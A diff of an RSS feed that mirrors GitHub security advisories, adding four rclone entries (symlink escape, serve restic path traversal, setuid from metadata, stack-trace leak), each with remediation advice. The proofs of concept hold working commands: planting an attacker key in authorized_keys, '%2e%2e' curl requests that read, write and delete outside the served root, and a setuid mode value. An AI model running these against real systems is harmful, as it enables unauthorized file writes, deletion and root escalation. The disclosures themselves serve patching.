@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-05T18:44:19.858Z</updated>
+    <updated>2026-08-05T20:15:05.095Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,487 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/rclone/rclone] rclone: Unvalidated symlink target in local `--links` — arbitrary file write from an untrusted remote]]></title>
+        <id>https://github.com/advisories/GHSA-cf44-9pgv-m4xc</id>
+        <link href="https://github.com/advisories/GHSA-cf44-9pgv-m4xc"/>
+        <updated>2026-08-05T20:15:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>With <code>-l/--links</code>, rclone serializes symlinks as <code>&lt;name&gt;.rclonelink</code> text objects whose body is the link target. When rclone writes such an object to a local destination, it recreates the symlink with <code>os.Symlink(&lt;object body&gt;, &lt;dest path&gt;)</code> and performs NO validation of the target. If the source is attacker-controlled, the attacker sets the body to any absolute or <code>../</code> path, so rclone plants a symlink inside the destination that points anywhere on the victim's filesystem. Because a sibling object named <code>&lt;name&gt;.rclonelink</code> sorts before <code>&lt;name&gt;/...</code>, rclone creates the escaping symlink first and then writes a following object "inside" it; <code>mkdirAll</code>/<code>OpenFile</code> follow the planted symlink, so the file lands OUTSIDE the destination with attacker-chosen contents. This yields arbitrary file write as the victim user, e.g. overwriting <code>~/.ssh/authorized_keys</code>, <code>~/.bashrc</code>, or a crontab — i.e. code execution.</p>
+<h3 id="details">Details</h3>
+<p><code>backend/local/local.go</code>, <code>Object.Update()</code>:</p>
+<pre><code class="language-go">} else {
+    out = nopWriterCloser{&amp;symlinkData}          // body of &lt;name&gt;.rclonelink = attacker data
+}
+...
+if o.translatedLink {
+    if err == nil {
+        if _, err := os.Lstat(o.path); err == nil {
+            os.Remove(o.path)
+        }
+        // Use the contents for the copied object to create a symlink
+        err = os.Symlink(symlinkData.String(), o.path)   // &lt;-- target NEVER validated (abs / .. allowed)
+    }
+}
+</code></pre>
+<p><code>symlinkData</code> is the raw body of the source object, fully attacker-controlled when copying from an untrusted remote. There is no check that the target is relative or stays within the destination. The subsequent write path (<code>mkdirAll()</code> → <code>file.MkdirAll</code>, then <code>file.OpenFile(..., O_CREATE)</code>) follows existing symlink components with no <code>O_NOFOLLOW</code>, so a file written under the planted symlinked directory escapes the destination.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Get the official stable binary:</li>
+</ol>
+<pre><code>curl -fsSLO https://downloads.rclone.org/v1.74.3/rclone-v1.74.3-linux-amd64.zip
+unzip -j rclone-v1.74.3-linux-amd64.zip '*/rclone' -d .      # ./rclone -&gt; v1.74.3
+</code></pre>
+<ol start="2">
+<li>Create an attacker-controlled "remote" (two objects) and a victim layout:</li>
+</ol>
+<pre><code>mkdir -p evil/pwn dest victimhome/.ssh
+printf '%s' "$PWD/victimhome/.ssh" &gt; evil/pwn.rclonelink              # body = abs path OUTSIDE dest
+printf 'ssh-ed25519 AAAA_ATTACKER_KEY pwned\n' &gt; evil/pwn/authorized_keys
+ls -l victimhome/.ssh                                                 # empty (before)
+</code></pre>
+<ol start="3">
+<li>Serve the malicious remote (models any untrusted remote — bucket / WebDAV / HTTP share):</li>
+</ol>
+<pre><code>cd evil &amp;&amp; python3 -m http.server 38080 --bind 127.0.0.1
+</code></pre>
+<ol start="4">
+<li>VICTIM ACTION — back up the untrusted remote preserving symlinks:</li>
+</ol>
+<pre><code>./rclone copy --links --http-url http://127.0.0.1:38080 :http: ./dest -v
+</code></pre>
+<ol start="5">
+<li>Observe — a file landed OUTSIDE <code>./dest</code>:</li>
+</ol>
+<pre><code>ls -l dest/pwn                       # dest/pwn -&gt; .../victimhome/.ssh   (symlink escapes dest)
+cat victimhome/.ssh/authorized_keys  # ssh-ed25519 AAAA_ATTACKER_KEY pwned   &lt;-- written outside dest
+</code></pre>
+<p><code>pwn.rclonelink</code> sorts before <code>pwn/authorized_keys</code>, so rclone creates the escaping symlink first and the next write follows it out of the destination. With rclone run as the victim user this overwrites <code>~/.ssh/authorized_keys</code>, <code>~/.bashrc</code>, or a crontab → code execution.</p>
+<h3 id="impact">Impact</h3>
+<p>An attacker who controls the contents of any remote a victim syncs with <code>-l/--links</code> gains arbitrary file write as the victim user, anywhere that user can write. Overwriting <code>~/.ssh/authorized_keys</code>, shell rc files, or cron files yields remote code execution on the victim's host. Even without the write-through step, the destination is silently populated with symlinks pointing anywhere on the local filesystem (confinement break / later read-or-write traversal).</p>
+<h3 id="remediation">Remediation</h3>
+<p>In <code>Object.Update()</code> reject symlink targets that are absolute or escape the destination root before calling <code>os.Symlink</code> (resolve <code>filepath.Join(dir, target)</code> and require it to stay within the configured root, or refuse absolute/<code>..</code> targets), and write objects with <code>O_NOFOLLOW</code> on the final component plus a no-symlink-in-parent check so a planted symlinked directory is never followed. Add a regression test copying a <code>.rclonelink</code> with target <code>/tmp/...</code> and a sibling file, asserting nothing is written outside the destination.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rclone/rclone/security/advisories/GHSA-cf44-9pgv-m4xc">https://github.com/rclone/rclone/security/advisories/GHSA-cf44-9pgv-m4xc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54572">https://nvd.nist.gov/vuln/detail/CVE-2026-54572</a></li>
+<li><a href="https://github.com/rclone/rclone/commit/1154afebee986180b489084d38e2a0c578751498">https://github.com/rclone/rclone/commit/1154afebee986180b489084d38e2a0c578751498</a></li>
+<li><a href="https://github.com/rclone/rclone/commit/874a804f5289517defdd7de68b2a374837080265">https://github.com/rclone/rclone/commit/874a804f5289517defdd7de68b2a374837080265</a></li>
+<li><a href="https://github.com/rclone/rclone/releases/tag/v1.74.4">https://github.com/rclone/rclone/releases/tag/v1.74.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-cf44-9pgv-m4xc">https://github.com/advisories/GHSA-cf44-9pgv-m4xc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cf44-9pgv-m4xc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-05T20:15:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/rclone/rclone] rclone: Incomplete path validation allows backend root escape in serve restic]]></title>
+        <id>https://github.com/advisories/GHSA-45pq-889g-fcgh</id>
+        <link href="https://github.com/advisories/GHSA-45pq-889g-fcgh"/>
+        <updated>2026-08-05T20:13:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>rclone serve restic</code> does not correctly reject URL paths beginning with <code>../</code>. On affected backends, an attacker who can access the REST endpoint can read, create, overwrite, or delete objects outside the path configured by the operator.</p>
+<p>The issue affects <code>rclone v1.40</code> through <code>rclone v1.74.4</code>. The proof of concept and backend matrix were validated with the official Linux AMD64 binary for <code>v1.74.4</code>, and the latest <code>master</code> commit reviewed at the time (<code>2217d38</code>) contained the same vulnerable validation. The main proof of concept uses WsgiDAV as an independent storage server and one rclone process.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>All releases from <code>v1.40</code> through <code>v1.74.4</code> are affected.</p>
+<h2 id="affected-components-and-backend-propagation">Affected components and backend propagation</h2>
+<p>The primary vulnerable component is the backend-independent <code>WithRemote</code> middleware in <code>cmd/serve/restic/restic.go</code>, lines 235-264. It accepts a leading parent component and stores that unsafe relative path in the request context. The REST handlers then pass the same value to whichever rclone backend the operator configured. Therefore, the flaw is not specific to WebDAV.</p>
+<p>The backend determines whether the accepted <code>../</code> path escapes, is preserved, or is encoded as safe filename characters. The source locations and line numbers below correspond to the release used for dynamic testing:</p>
+<table>
+<thead>
+<tr>
+<th>Layer or backend</th>
+<th>File and function</th>
+<th align="right">Relevant lines</th>
+<th>Path propagation</th>
+<th>Dynamic evidence</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>REST server, primary cause</td>
+<td><code>cmd/serve/restic/restic.go</code>, <code>WithRemote</code></td>
+<td align="right">235-264</td>
+<td>Accepts a leading <code>../</code> remote and shares it with GET, HEAD, POST, and DELETE handlers</td>
+<td>Confirmed through WebDAV</td>
+</tr>
+<tr>
+<td>WebDAV</td>
+<td><code>backend/webdav/webdav.go</code>, <code>(*Fs).filePath</code></td>
+<td align="right">421-427</td>
+<td><code>path.Join(f.root, file)</code> removes the configured root when resolving <code>../</code></td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>FTP</td>
+<td><code>backend/ftp/ftp.go</code>, <code>(*Fs).NewObject</code>, <code>(*Object).Open</code>, <code>Update</code>, and <code>Remove</code></td>
+<td align="right">844-848, 1308-1311, 1349-1356, 1411-1415</td>
+<td>Each operation joins the backend root and remote with <code>path.Join</code> before the FTP request</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td><code>backend/http/http.go</code>, <code>(*Fs).url</code></td>
+<td align="right">386-395</td>
+<td>Appends the escaped remote containing <code>../</code> to the configured endpoint URL</td>
+<td>read</td>
+</tr>
+<tr>
+<td>Memory</td>
+<td><code>backend/memory/memory.go</code>, <code>(*Fs).split</code></td>
+<td align="right">227-231</td>
+<td>Joins <code>f.root</code> and the relative path before splitting the in-memory bucket and key</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>SFTP</td>
+<td><code>backend/sftp/sftp.go</code>, <code>(*Fs).remotePath</code></td>
+<td align="right">2086-2089</td>
+<td>Joins <code>f.absRoot</code> and the remote, allowing the parent component to remove the published subdirectory</td>
+<td>read, write, delete</td>
+</tr>
+</tbody></table>
+<p>These are backend-specific manifestations of the same <code>WithRemote</code> validation flaw, not separate vulnerabilities.</p>
+<h2 id="technical-details">Technical Details</h2>
+<p><code>WithRemote</code> obtains the decoded URL path, removes external slashes, and tries to reject traversal by comparing the path with <code>path.Clean</code>:</p>
+<pre><code class="language-go">urlpath = strings.Trim(urlpath, "/")
+// Reject any non-canonical path, in particular one containing ".."
+// traversal elements.
+if urlpath != "" &amp;&amp; path.Clean(urlpath) != urlpath {
+    http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
+    return
+}
+</code></pre>
+<p>The comment describes the intended behavior, but the condition does not reject every parent component. <code>path.Clean</code> preserves leading parent components in a relative path:</p>
+<pre><code class="language-text">path.Clean("../outside.txt")  = "../outside.txt"
+path.Clean("../../outside.txt") = "../../outside.txt"
+</code></pre>
+<p>Because both strings are equal, the middleware accepts the path. Internal traversal behaves differently:</p>
+<pre><code class="language-text">path.Clean("a/../../outside.txt") = "../outside.txt"
+</code></pre>
+<p>These strings differ, so that request returns HTTP 400. This explains why the existing check appears to work while the leading variant bypasses it.</p>
+<p>After validation, <code>WithRemote</code> stores the accepted value in the request context:</p>
+<pre><code class="language-go">ctx := context.WithValue(r.Context(), ContextRemoteKey, urlpath)
+next.ServeHTTP(w, r.WithContext(ctx))
+</code></pre>
+<p>GET, POST, and DELETE handlers retrieve this same value. GET passes it to <code>s.f.NewObject</code>, POST passes it to <code>operations.RcatSize</code>, and DELETE resolves the object and calls <code>Remove</code>. There is no second containment check.</p>
+<p>WebDAV is used below as the concrete end-to-end example because it was the backend used for the main proof of concept. WebDAV is not the source of the validation flaw. The example demonstrates one way in which an unsafe remote accepted by <code>WithRemote</code> is propagated by a backend.</p>
+<p>The WebDAV backend joins its configured root with the attacker-controlled remote:</p>
+<pre><code class="language-go">func (f *Fs) filePath(file string) string {
+    subPath := path.Join(f.root, file)
+    if f.opt.Enc != encoder.EncodeZero {
+        subPath = f.opt.Enc.FromStandardPath(subPath)
+    }
+    return rest.URLPathEscapeAll(subPath)
+}
+</code></pre>
+<p>For the proof of concept:</p>
+<pre><code class="language-text">f.root = "served-root"
+file = "../outside-secret.txt"
+
+path.Join("served-root", "../outside-secret.txt")
+= "outside-secret.txt"
+</code></pre>
+<p>The configured root is removed before encoding. WsgiDAV receives a normal operation for <code>/outside-secret.txt</code>, which is outside the root published by <code>rclone serve restic</code>.</p>
+<p>The same accepted leading parent path propagates through the other affected backends tested. FTP joins its root and remote with <code>path.Join</code> before object operations; HTTP preserves <code>served-root/../outside-secret.txt</code> when constructing the endpoint request; Memory joins the root and relative path before splitting the bucket and key; and SFTP joins <code>f.absRoot</code> and the remote in <code>remotePath</code>. In each case, the backend receives the leading parent component already accepted by <code>WithRemote</code>. The exact escape mechanism and available operations vary by backend. Conversely, S3-compatible and local backends did not escape in the tested configuration because they encoded <code>..</code> as filename characters.</p>
+<p>Expected behavior is HTTP 400 before any backend operation. Actual behavior is HTTP 200 followed by an operation outside <code>served-root</code>.</p>
+<h2 id="preconditions-and-impact">Preconditions and impact</h2>
+<p>The operator must publish a backend subdirectory, the endpoint must be reachable, and the backend credential must have access to a parent or sibling object. Exploitability also depends on backend path semantics.</p>
+<p>An attacker may:</p>
+<ul>
+<li>read files and objects outside the published backup root;</li>
+<li>create or overwrite sibling objects;</li>
+<li>delete objects when deletion is permitted;</li>
+<li>cross isolation boundaries between users, repositories, or automation jobs;</li>
+<li>indirectly compromise another system if it later trusts an overwritten configuration, script, or artifact.</li>
+</ul>
+<p><code>--append-only</code> reduces overwrite and delete impact but does not prevent traversal reads or creation of new objects.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>The following procedure was executed on Linux Mint 22.3 with the official <code>rclone v1.74.4</code> Linux AMD64 binary, WsgiDAV 4.3.5, and Cheroot 10.0.1. The rclone binary reports that it was built with Go 1.26.5.</p>
+<h3 id="1-create-the-storage-layout">1. Create the storage layout</h3>
+<pre><code class="language-console">$ mkdir -p poc/storage/served-root
+$ printf '%s\n' 'INSIDE-PUBLISHED-ROOT' &gt; poc/storage/served-root/inside.txt
+$ printf '%s\n' 'SECRET-OUTSIDE-PUBLISHED-ROOT' &gt; poc/storage/outside-secret.txt
+$ find poc/storage -type f
+poc/storage/served-root/inside.txt
+poc/storage/outside-secret.txt
+</code></pre>
+<h3 id="2-start-the-independent-webdav-server">2. Start the independent WebDAV server</h3>
+<pre><code class="language-console">$ python3 -m venv poc/venv
+$ poc/venv/bin/pip install 'WsgiDAV==4.3.5' 'cheroot==10.0.1'
+$ poc/venv/bin/wsgidav --host=127.0.0.1 --port=39500 \
+    --root="$PWD/poc/storage" --auth=anonymous --no-config
+Running without configuration file.
+...
+Server: WsgiDAV/4.3.5 Cheroot/10.0.1 Python/3.12.3
+</code></pre>
+<h3 id="3-download-verify-and-start-rclone">3. Download, verify, and start rclone</h3>
+<pre><code class="language-console">$ curl -fLO https://downloads.rclone.org/v1.74.4/rclone-v1.74.4-linux-amd64.zip
+$ curl -fLO https://downloads.rclone.org/v1.74.4/SHA256SUMS
+$ grep '  rclone-v1.74.4-linux-amd64.zip$' SHA256SUMS | sha256sum -c -
+rclone-v1.74.4-linux-amd64.zip: OK
+
+$ unzip rclone-v1.74.4-linux-amd64.zip
+$ ./rclone-v1.74.4-linux-amd64/rclone version | head -n 1
+rclone v1.74.4
+
+$ ./rclone-v1.74.4-linux-amd64/rclone serve restic ':webdav:served-root' \
+    --webdav-url http://127.0.0.1:39500 \
+    --webdav-vendor other --addr 127.0.0.1:39501 -vv
+NOTICE: webdav root 'served-root': Serving restic REST API on [http://127.0.0.1:39501/]
+</code></pre>
+<h3 id="4-confirm-normal-access">4. Confirm normal access</h3>
+<pre><code class="language-console">$ curl --path-as-is -i http://127.0.0.1:39501/inside.txt
+HTTP/1.1 200 OK
+...
+INSIDE-PUBLISHED-ROOT
+</code></pre>
+<h3 id="5-read-outside-the-published-root">5. Read outside the published root</h3>
+<pre><code class="language-console">$ curl --path-as-is -i http://127.0.0.1:39501/%2e%2e/outside-secret.txt
+HTTP/1.1 200 OK
+...
+SECRET-OUTSIDE-PUBLISHED-ROOT
+</code></pre>
+<h3 id="6-write-outside-the-published-root">6. Write outside the published root</h3>
+<pre><code class="language-console">$ curl --path-as-is -i -X POST \
+    http://127.0.0.1:39501/%2e%2e/outside-write.txt \
+    --data-binary 'ATTACKER-CONTROLLED-OUTSIDE-ROOT'
+HTTP/1.1 200 OK
+...
+
+$ cat poc/storage/outside-write.txt
+ATTACKER-CONTROLLED-OUTSIDE-ROOT
+</code></pre>
+<h3 id="7-delete-outside-the-published-root">7. Delete outside the published root</h3>
+<pre><code class="language-console">$ curl --path-as-is -i -X DELETE \
+    http://127.0.0.1:39501/%2e%2e/outside-write.txt
+HTTP/1.1 200 OK
+...
+
+$ test ! -e poc/storage/outside-write.txt &amp;&amp; echo 'physical file deleted'
+physical file deleted
+</code></pre>
+<h3 id="8-compare-with-internal-traversal">8. Compare with internal traversal</h3>
+<pre><code class="language-console">$ curl --path-as-is -i http://127.0.0.1:39501/a/../../outside-secret.txt
+HTTP/1.1 400 Bad Request
+...
+Bad Request
+</code></pre>
+<p>This demonstrates why the existing check appears to work for interior traversal while the leading variant bypasses it.</p>
+<h2 id="tested-backends">Tested backends</h2>
+<table>
+<thead>
+<tr>
+<th>Backend</th>
+<th>Local implementation</th>
+<th>Result</th>
+<th>Operations tested</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WebDAV</td>
+<td>WsgiDAV 4.3.5</td>
+<td>Affected</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>FTP</td>
+<td>pyftpdlib 2.2.0</td>
+<td>Affected</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>Python <code>http.server</code> 3.12.3</td>
+<td>Affected</td>
+<td>read</td>
+</tr>
+<tr>
+<td>Memory</td>
+<td>rclone memory backend</td>
+<td>Affected</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>SFTP</td>
+<td><code>atmoz/sftp</code> OpenSSH server</td>
+<td>Affected</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>S3 compatible</td>
+<td>MinIO</td>
+<td>No root escape observed</td>
+<td>read, write, delete</td>
+</tr>
+<tr>
+<td>Local filesystem</td>
+<td>default local encoding</td>
+<td>No root escape observed</td>
+<td>read, write, delete</td>
+</tr>
+</tbody></table>
+<p>Only the backends listed in this table were tested or classified. Every row was dynamically repeated with the same official <code>v1.74.4</code> Linux AMD64 binary identified in the proof of concept.</p>
+<h2 id="suggested-remediation">Suggested remediation</h2>
+<p>Reject <code>.</code> and <code>..</code> components in <code>WithRemote</code> before storing the remote in the context. Validating the decoded relative path with <code>io/fs.ValidPath</code>, with explicit handling for the empty API root, is one possible approach. Authorization and backend lookup should use the same validated representation.</p>
+<p>Regression tests should cover GET, HEAD, POST, and DELETE with <code>..</code>, <code>../x</code>, <code>../../x</code>, <code>%2e%2e/x</code>, <code>a/../x</code>, and <code>a/../../x</code>, both with and without <code>--private-repos</code>.</p>
+<h2 id="additional-impact-scenarios-identified-by-the-maintainer">Additional impact scenarios identified by the maintainer</h2>
+<ul>
+<li><code>GET /../</code> could reach the list handler and enumerate the parent directory, allowing an attacker to discover object names before accessing them.</li>
+<li>With <code>--append-only</code>, a request such as <code>DELETE /../locks/&lt;name&gt;</code> could satisfy the existing delete guard and delete an object outside the served root.</li>
+<li>A bare <code>.</code> path was also accepted. On bucket-based backends, <code>POST /.</code> could write an object outside the intended served path.</li>
+</ul>
+<p>Credit: Caubi Loureiro of Vorpcel Research</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rclone/rclone/security/advisories/GHSA-45pq-889g-fcgh">https://github.com/rclone/rclone/security/advisories/GHSA-45pq-889g-fcgh</a></li>
+<li><a href="https://github.com/rclone/rclone/commit/cc5a189f00efe68ed0ddb32d3237b42549a9f264">https://github.com/rclone/rclone/commit/cc5a189f00efe68ed0ddb32d3237b42549a9f264</a></li>
+<li><a href="https://github.com/rclone/rclone/releases/tag/v1.75.0">https://github.com/rclone/rclone/releases/tag/v1.75.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-45pq-889g-fcgh">https://github.com/advisories/GHSA-45pq-889g-fcgh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-45pq-889g-fcgh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-05T20:13:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/rclone/rclone] rclone local `--metadata` applies attacker-controlled mode/uid - setuid binary planted from an untrusted remote]]></title>
+        <id>https://github.com/advisories/GHSA-945v-v9p3-v5xw</id>
+        <link href="https://github.com/advisories/GHSA-945v-v9p3-v5xw"/>
+        <updated>2026-08-05T20:03:14.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When writing an object with metadata, the local backend applies the source-supplied <code>mode</code>, <code>uid</code>, and <code>gid</code> verbatim: it parses <code>mode</code> as an octal integer and passes it straight into <code>os.Chmod(o.path, os.FileMode(umode))</code>, and passes <code>uid</code>/<code>gid</code> straight into <code>os.Chown</code>. The value is never masked to permission bits, so any value with Go's <code>ModeSetuid</code> (1&lt;&lt;23) or <code>ModeSetgid</code> (1&lt;&lt;22) bit set causes the setuid/setgid bit to be applied. Because both the file content and its metadata come from the (attacker-controlled) source remote, an attacker stores a binary of their choosing with <code>mode = 40000755</code> (and <code>uid = 0</code>); when the victim runs <code>rclone copy -M &lt;remote&gt;: /dest</code>, rclone writes the attacker's binary and makes it setuid. If the victim runs rclone as root (typical for system backup/restore), the <code>uid=0</code> chown plus setuid produces a root-owned setuid binary with attacker content — any local user then escalates to root. When rclone runs as a non-root service user, the planted setuid binary is owned by that user, giving any local user that user's privileges (lateral escalation / persistent backdoor).</p>
+<h3 id="details">Details</h3>
+<p><code>backend/local/metadata.go</code>, <code>writeMetadataToFile()</code>:</p>
+<pre><code class="language-go">uid, hasUID := o.parseMetadataInt(m, "uid", 10)
+gid, hasGID := o.parseMetadataInt(m, "gid", 10)
+if hasUID {
+    ...
+    err = os.Chown(o.path, uid, gid)        // source-controlled owner, no same-uid guard
+}
+mode, hasMode := o.parseMetadataInt(m, "mode", 8)
+if hasMode &amp;&amp; mode &gt;= 0 {
+    umode := uint(mode)
+    if umode &lt;= math.MaxUint32 {
+        err = os.Chmod(o.path, os.FileMode(umode))   // &lt;-- raw value; ModeSetuid/ModeSetgid NOT masked off
+    }
+}
+</code></pre>
+<p><code>os.Chmod</code>/<code>os.FileMode</code> honor <code>ModeSetuid</code>/<code>ModeSetgid</code>/<code>ModeSticky</code>. There is no <code>&amp;^ (os.ModeSetuid|os.ModeSetgid)</code> mask and no check that the source is trusted, so an attacker-chosen <code>mode</code> string sets those bits on the freshly written, attacker-controlled file. (Note: a legitimate local source reports <code>mode</code> in unix <code>st_mode</code> layout e.g. <code>0106755</code>, whose bit 1&lt;&lt;23 is unset, so honest copies happen to drop setuid — but the attacker supplies the Go-<code>FileMode</code> layout <code>40000755</code> directly, which sets it.)</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Get the official stable binary:</li>
+</ol>
+<pre><code>curl -fsSLO https://downloads.rclone.org/v1.74.3/rclone-v1.74.3-linux-amd64.zip
+unzip -j rclone-v1.74.3-linux-amd64.zip '*/rclone' -d .      # ./rclone -&gt; v1.74.3
+</code></pre>
+<ol start="2">
+<li>Create a payload (the attacker-controlled binary content) and copy it with the malicious <code>mode</code> metadata:</li>
+</ol>
+<pre><code>mkdir -p msrc mdst &amp;&amp; cp /bin/true msrc/payload
+./rclone copy -M --metadata-set mode=40000755 msrc mdst       # 40000755 = Go FileMode setuid|0755
+</code></pre>
+<ol start="3">
+<li>Observe — the destination file is now setuid:</li>
+</ol>
+<pre><code>stat -c '%A %a' mdst/payload
+-rwsr-xr-x 4755                                               # 's' = setuid bit SET on attacker binary
+</code></pre>
+<p>Variants: <code>mode=20000755</code> → setgid (<code>-rwxr-sr-x</code>); <code>mode=60000755</code> → both (<code>-rwsr-sr-x</code>). With rclone run as root and the source object also carrying <code>uid=0</code>/<code>gid=0</code>, the file is chown'd root:root, yielding a root-owned setuid binary executable by any local user.</p>
+<h3 id="impact">Impact</h3>
+<p>A victim performing a metadata-preserving copy/restore (<code>-M</code>) from an untrusted or compromised remote installs an attacker-chosen executable with the setuid/setgid bit set. Run as root (system backup/restore, the common case for <code>--metadata</code>), this is a root-owned setuid root backdoor executable by any local user → local privilege escalation to root. Run as a non-root user, it is a setuid backdoor for that service account. The companion <code>uid</code>/<code>gid</code> application lets a root-run transfer also reassign ownership of written files arbitrarily.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Mask special bits before applying mode from metadata — <code>os.Chmod(o.path, os.FileMode(umode).Perm())</code> (or <code>umode &amp; 0o777</code>) — and do not honor setuid/setgid/sticky from source metadata; gate <code>uid</code>/<code>gid</code>/setuid application behind an explicit opt-in (e.g. <code>--local-metadata-set-ownership</code>) that is off by default, and document that <code>-M</code> from untrusted remotes must not restore privileged bits. Regression test: copying an object with <code>mode=40000755</code>/<code>uid=0</code> must produce a non-setuid, caller-owned file unless the opt-in is set.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rclone/rclone/security/advisories/GHSA-945v-v9p3-v5xw">https://github.com/rclone/rclone/security/advisories/GHSA-945v-v9p3-v5xw</a></li>
+<li><a href="https://github.com/rclone/rclone/commit/e58f09739a35774ca82b5211d2377ac0f2051500">https://github.com/rclone/rclone/commit/e58f09739a35774ca82b5211d2377ac0f2051500</a></li>
+<li><a href="https://github.com/rclone/rclone/releases/tag/v1.74.4">https://github.com/rclone/rclone/releases/tag/v1.74.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-945v-v9p3-v5xw">https://github.com/advisories/GHSA-945v-v9p3-v5xw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-945v-v9p3-v5xw</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-08-05T20:03:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/rclone/rclone] rclone: Verbose Stack Trace Disclosure in RC API Error Responses]]></title>
+        <id>https://github.com/advisories/GHSA-gwfq-86j8-7qhv</id>
+        <link href="https://github.com/advisories/GHSA-gwfq-86j8-7qhv"/>
+        <updated>2026-08-05T20:01:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When an RC API call triggers a panic (recovered by the job runner), the full Go stack trace is included in the JSON error response. This leaks internal file paths, Go module versions, goroutine state, and memory addresses to the API caller.</p>
+<h3 id="details">Details</h3>
+<p>The panic recovery in <code>fs/rc/jobs/job.go:110-115</code>:</p>
+<pre><code class="language-go">func (j *Job) run(ctx context.Context, fn rc.Func, in rc.Params) {
+    defer func() {
+        if r := recover(); r != nil {
+            j.mu.Lock()
+            j.EndTime = time.Now()
+            j.Error = fmt.Sprintf("panic received: %v \n%s", r, string(debug.Stack()))
+            // ...
+        }
+    }()
+</code></pre>
+<p>The full <code>debug.Stack()</code> output is placed into <code>j.Error</code>, which is then returned in the HTTP response JSON.</p>
+<h3 id="poc">PoC</h3>
+<p>Trigger a parse error by setting config path to a non-INI file, then calling dump:</p>
+<pre><code class="language-bash">curl -s -X POST http://localhost:5572/config/setpath \
+  -H "Content-Type: application/json" \
+  -d '{"path":"/etc/hostname"}' 
+
+curl -s -X POST http://localhost:5572/config/dump
+</code></pre>
+<p>Response includes:</p>
+<pre><code class="language-json">{
+  "error": "panic received: fatal error: Failed to load config file \"/etc/hostname\": could not parse line: ... \ngoroutine 9 [running]:\nruntime/debug.Stack()\n\truntime/debug/stack.go:26 +0x64\ngithub.com/rclone/rclone/fs/rc/jobs.(*Job).run.func1()\n\tgithub.com/rclone/rclone/fs/rc/jobs/job.go:112 +0x34\n...",
+  "status": 500
+}
+</code></pre>
+<p><strong>Disclosed information includes:</strong></p>
+<ul>
+<li>Full filesystem paths (<code>github.com/rclone/rclone/fs/config/config.go:377</code>)</li>
+<li>Go module versions (<code>github.com/go-chi/chi/v5@v5.2.5</code>)</li>
+<li>Go runtime version (from binary)</li>
+<li>Goroutine IDs and states</li>
+<li>Memory addresses (ASLR leak)</li>
+<li>File contents (first unparseable line of the target file)</li>
+</ul>
+<p><strong>Tested and confirmed on rclone v1.74.4.</strong></p>
+<h3 id="impact">Impact</h3>
+<p>Information disclosure that aids exploitation of other vulnerabilities. Stack traces reveal internal architecture, dependency versions (useful for known-CVE targeting), and memory layout. The error message also leaks partial file contents (the first line that fails INI parsing), which can be used alongside the arbitrary file read finding as a complementary file read primitive for non-INI files.</p>
+<h3 id="affected-versions">Affected Versions</h3>
+<p>All versions with RC API support through at least v1.74.4.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Return a generic error message to the API caller. Log the full stack trace server-side only. Strip <code>debug.Stack()</code> from HTTP responses.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rclone/rclone/security/advisories/GHSA-gwfq-86j8-7qhv">https://github.com/rclone/rclone/security/advisories/GHSA-gwfq-86j8-7qhv</a></li>
+<li><a href="https://github.com/rclone/rclone/commit/ff43a1e3ae17627c80e523a0ca7445f96516d199">https://github.com/rclone/rclone/commit/ff43a1e3ae17627c80e523a0ca7445f96516d199</a></li>
+<li><a href="https://github.com/rclone/rclone/releases/tag/v1.75.0">https://github.com/rclone/rclone/releases/tag/v1.75.0</a></li>
